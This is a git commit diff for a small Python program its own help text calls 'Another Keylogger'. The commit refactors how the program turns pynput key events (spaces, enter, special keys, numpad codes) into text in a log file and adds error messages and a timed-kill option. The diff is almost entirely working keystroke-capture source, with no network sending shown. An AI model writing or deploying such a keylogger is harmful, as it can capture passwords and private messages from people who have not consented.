268f88e5ce388f09bd3de4984af9235f62fd2fd6
Kearash <kearash@pm.me>
2023-02-11 20:26:49 -0500

    feat: better error handling

--- ak.py
+++ ak.py
@@ -9,7 +9,7 @@ from pynput import keyboard
 __version__ = '0.1.0'
 
 
-def arg_parse():
+def arg_parser():
     parser = argparse.ArgumentParser(
         prog="akpy",
         description="Another Keylogger. Python.",
@@ -28,46 +28,66 @@ def arg_parse():
     return args
 
 
+def throw_err(msg):
+    print('\033[91m\033[1m' + msg + '\033[0m')
+    print('\033[1mIf you need help try -h.\033[0m')
+    exit(1)
+
+
+def file_parser(file, key_event):
+    if str(key_event).startswith('Release'):
+        pass
+    elif key_event.key == keyboard.Key.space:
+        file.write(' ')
+    elif key_event.key == keyboard.Key.enter:
+        file.write('\n')
+    elif str(key_event.key).startswith('Key'):
+        file.write(
+            "[" + str(key_event.key).split(".")[1].upper() + "]")
+    elif str(key_event.key).startswith('<'):
+        signal_number = int(
+            str(key_event.key).split('<')[1].split('>')[0])
+        numpad_number = signal_number - 96
+        key = '[NumPad' + str(numpad_number) + \
+            ']' if numpad_number != 14 else '.'
+        content = str(
+            numpad_number) if arg_parser().quiet else key
+        file.write(content)
+    else:
+        file.write(str(key_event.key).split("'")[1])
+
+
+def file_validator():
+    try:
+        open(arg_parser().output, 'x')
+    except FileExistsError:
+        throw_err('File exists! specify -w to overwrite.')
+    except TypeError:
+        throw_err(
+            'Invalid output argument! You should specify a file path after -o.')
+    except FileNotFoundError:
+        pass
+
+
 def main():
-    opt = 'w' if arg_parse().overwrite else 'x'
+    opt = 'w' if arg_parser().overwrite else 'x'
     with keyboard.Events() as events:
-        try:
-            with open(arg_parse().output, opt) as file:
-                for event in events:
-                    if str(event).startswith('Release'):
-                        pass
-                    elif event.key == keyboard.Key.space:
-                        file.write(' ')
-                    elif event.key == keyboard.Key.enter:
-                        file.write('\n')
-                    elif str(event.key).startswith('Key'):
-                        file.write(
-                            "[" + str(event.key).split(".")[1].upper() + "]")
-                    elif str(event.key).startswith('<'):
-                        signal_number = int(
-                            str(event.key).split('<')[1].split('>')[0])
-                        numpad_number = signal_number - 96
-                        key = '[NumPad' + str(numpad_number) + \
-                            ']' if numpad_number != 14 else '.'
-                        content = str(
-                            numpad_number) if arg_parse().quiet else key
-                        file.write(content)
-                    else:
-                        file.write(str(event.key).split("'")[1])
-        except FileExistsError:
-            print('\033[91m\033[1mFile exists! specify -w to overwrite.\033[0m')
+        with open(arg_parser().output, opt) as file:
+            for event in events:
+                file_parser(file, event)
 
 
 if __name__ == '__main__':
+    file_validator()
     try:
-        if arg_parse().kill:
+        if arg_parser().kill:
             process = multiprocessing.Process(target=main, name="Main")
             process.start()
-            time.sleep(int(arg_parse().kill))
+            time.sleep(float(arg_parser().kill))
             process.terminate()
             process.join()
         else:
             main()
         print('\033[90m\033[1mRunning...\033[0m')
     except KeyboardInterrupt:
-        print('\033[91m\033[1mProgram Terminated\033[0m')
+        throw_err('Program Terminated\033[0m')
